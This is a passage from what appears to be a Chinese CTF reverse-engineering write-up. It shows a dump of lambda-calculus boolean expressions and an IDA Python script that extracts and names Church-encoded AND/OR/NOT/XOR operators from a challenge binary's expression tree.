class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br></code></pre></td></tr></table></figure><p>==原始表达式提取 ida 脚本==</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFuncName</span>(<span class="hljs-params">func, args = <span class="hljs-built_in">list</span>(<span class="hljs-params"></span>)</span>):</span><br>    <span class="hljs-keyword">if</span> func[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;lambda&quot;</span>:<br>        args.append(func[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">return</span> getFuncName(func[<span class="hljs-number">2</span>], args)<br><br>    <span class="hljs-keyword">if</span> func[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;call&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">if</span> func == [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;AND&quot;</span><br>        <span class="hljs-keyword">if</span> func == [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;OR&quot;</span><br><br>        <span class="hljs-keyword">if</span> func == [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;OR&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;AND&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]], [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;NOT&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]]]], [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;AND&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;NOT&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;XOR&quot;</span><br>        <br>        <span class="hljs-keyword">if</span> func == [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;OR&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;AND&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]], [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;NOT&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]]]], [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;AND&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, <span class="hljs-string">&#x27;NOT&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;XOR&quot;</span><br><br>    <span class="hljs-keyword">if</span> func[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;call&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> func == [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;call&#x27;</span>, [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">2</span>]]], [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NOT&quot;</span><br><br>    <span class="hljs-keyword">if</span> func[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;symbol&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">if</span> func == [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">0</span>]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;TRUE&quot;</span><br>        <span class="hljs-keyword">elif</span> func == [<span class="hljs-string">&#x27;symbol&#x27;</span>, args[<span class="hljs-number">1</span>]]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FALSE&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isNativeLambda</span>(<span class="hljs-params">l</span>):</span><br>    keywords = [<span class="hljs-string">&quot;TRUE&quot;</span>, <span class="hljs-string">&quot;FALSE&quot;</span>, <span class="hljs-string">&quot;AND&quot;</span>, <span class="hljs-string">&quot;OR&quot;</span>, <span class="hljs-string">&quot;NOT&quot;</span>]<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> keywords:<br>        <span class="hljs-keyword">if</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(l):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">entry, env = <span class="hljs-built_in">set</span>(<span class="hljs-params"></span>)</span>):</span><br>    ExprType = idc.get_qword(entry)<br>    <span class="hljs-keyword">if</span> ExprType == <span class="hljs-number">2</span>: <span class="hljs-comment"># call</span><br>        func = dump(idc.get_qword(entry + <span class="hljs-number">8</span>), env)<br>        <br>        func_name = getFuncName(func, [])<br>        <span class="hljs-keyword">if</span> func_name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            func = func_name <br>        <br>        arg  = dump(idc.get_qword(entry + <span class="hljs-number">16</span>), env)<br>        arg_name = getFuncName(arg, [])<br>        <span class="hljs-keyword">if</span> arg_name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            arg = arg_name<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-string">&quot;call&quot;</span>, func, arg]<br><br><br>    <span class="hljs-keyword">if</span> ExprType == <span class="hljs-number">0</span>: <span class="hljs-comment"># symbol</span><br>        sym = <span class="hljs-built_in">str</span>(idc.get_qword(entry + <span class="hljs-number">8</span>))<br>        env.add(sym)<br>        <span class="hljs-keyword">return</span>  [<span class="hljs-string">&quot;symbol&quot;</span>, sym]<br><br>    <span class="hljs-keyword">if</span> ExprType == <span class="hljs-number">1</span>: <span class="hljs-comment"># lambda</span><br>        body = dump(idc.get_qword(entry + <span class="hljs-number">16</span>), env)<br>        sym = <span class="hljs-built_in">str</span>(idc.get_qword(entry + <span class="hljs-number">8</span>))<br>        <span class="hljs-keyword">if</span> sym <span class="hljs-keyword">in</span> env:<br>            env.remove(sym)<br>            <br>        <span class="hljs-keyword">return</span> [<span class="hljs-string">&quot;lambda&quot;</span>, sym, body]<br>    <span class="hljs-keyword">raise</span><br></code></pre></td></tr></table></figure><p>调用 <code>exprs = dump(0x12F450)</code> 得到表达式数组。</p><p>==表达式化简脚本==</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 